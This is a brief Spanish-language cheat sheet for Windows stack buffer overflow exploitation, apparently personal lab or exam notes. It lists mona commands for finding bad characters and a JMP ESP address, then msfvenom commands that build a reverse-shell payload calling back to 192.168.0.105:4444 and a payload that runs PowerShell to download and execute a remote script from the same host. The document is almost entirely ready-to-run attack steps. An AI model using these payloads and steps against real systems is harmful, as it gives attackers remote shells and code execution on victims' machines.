
# Generar cadena bytearray
```pip install badchars```
```badchars -f python```

## MONA
#### Configurar carpeta de trabajo
```!mona config -set workingfolder C:\Users\win7bits\Desktop\%p```
#### Generar badchars
```!mona bytearray -b "\x00"```   
```!mona bytearray -b "\x00\x07"```
#### Comparar haciendo referencia al bytearray que generó y la dirección a la que apunta ESP
```!mona compare -f C:\mona\appname\bytearray.bin -a <address>```
#### Encontrar el punto de salto
```!mona jmp -r esp -cpb \x07\x2e\xa0\x00"```   
```!mona jmp -r esp -cpb "\x00"```

## SHELLCODE
#### cmd
```msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c```
#### Powershell
```msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.105:8000/PS.ps1')" lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c```

#### Idioma teclado
ES Spanish (United States)
